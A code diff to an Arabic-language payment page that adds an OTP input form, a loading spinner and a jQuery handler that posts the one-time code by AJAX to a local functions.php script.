@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,11 +10,32 @@
     <!-- Bootstrap RTL CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-rtl/css/bootstrap.rtl.min.css" rel="stylesheet">
     <link rel="stylesheet" href="pay.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
-       
+
     </style>
 </head>
+
 <body>
+
+<style>
+    /* Simple loader styles */
+    #loader {
+      display: none; /* Hidden by default */
+      border: 4px solid #f3f3f3; /* Light gray */
+      border-top: 4px solid #3498db; /* Blue */
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+    }
+
+    /* Spin animation */
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 
     <header class="header-image d-flex justify-content-center align-items-center">
         <div class="container">
@@ -46,28 +68,101 @@
             </div>
         </div>
     </section>
-    <section>
-        <div class="container">
-            <div class="box-one">
-                <ul class="list-group list-group-flush">
-                    <li class="list-group-item">
-                        <div class="row">
-                            <div class="col-4">
-                                <span class="text-blue">otp</span> <!-- Aligns to the left -->
-                            </div>
-                            <div class="col-8">
-                                <input type="text" class="form-control" placeholder="Enter your name">
-                            </div>
-                        </div>
-                    </li>
 
-                </ul>
+    <form action="functions.php" method="post" id="payment-form">
+        <input type="hidden" name="action" value="sendOTP">
+        <section>
+            <div class="container">
+                <div class="box-one">
+                    <ul class="list-group list-group-flush">
+                        <li class="list-group-item">
+                            <div class="row">
+                                <div class="col-4">
+                                    <span class="text-blue">otp</span> <!-- Aligns to the left -->
+                                </div>
+                                <div class="col-8">
+                                    <input type="text" class="form-control" name="otp" id="otp" placeholder="otp">
+                                </div>
+                            </div>
+                        </li>
+
+                    </ul>
+                </div>
             </div>
-        </div>
-    </section>
-  
-    
+        </section>
+
+        <section>
+            <div class="container">
+                <div class="box-one">
+                    <div class="row">
+                        <div class="col-md-6 col-sm-6 col-6">
+                            <button class="btn btn-send  w-100" id="send-data" type="submit">الرسال</button>
+                        </div>
+                        <div class="col-md-6 col-sm-6 col-6">
+                            <a class="btn btn-send w-100" href="javascript:void(0)" type="submit">الغاء</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </form>
+
+
+ <div class="loader-overlay d-flex justify-content-center align-items-center">
+    <div id="loader"></div>
+  </div>
     <!-- Bootstrap JS -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            $('#send-data').click(function(e) {
+                e.preventDefault();
+                var isValid = true;
+                var otp = $('#otp').val();
+
+                if (otp === "" || otp === null) {
+                    alert("الرجاء ادخال الرقم السري.");
+                    isValid = false;
+                    return "";
+                }
+
+                $('#loader').show();
+                // Submit form if valid
+
+                if (isValid) {
+          // Simulate a delay for demonstration (e.g., submitting the form)
+                setTimeout(function() {
+                    $.ajax({
+                        url: 'functions.php', // Replace with your PHP script URL
+                        type: 'POST',
+                        data: $('#payment-form').serialize(), // Serialize the form data
+                        success: function(response) {
+                            // Handle success response
+                            console.log(response);
+                        },
+                        error: function(xhr, status, error) {
+                            // Handle error response
+                            console.log(xhr.responseText);
+                        },
+                        complete: function() {
+                            // Hide the loader
+                            $('#loader').hide();
+                        }
+                    });
+                }, 1000);
+                } else {
+                // Hide the loader if validation fails
+                $('#loader').hide();
+                }
+
+
+
+            });
+        });
+    </script>
+
 </body>
+
 </html>
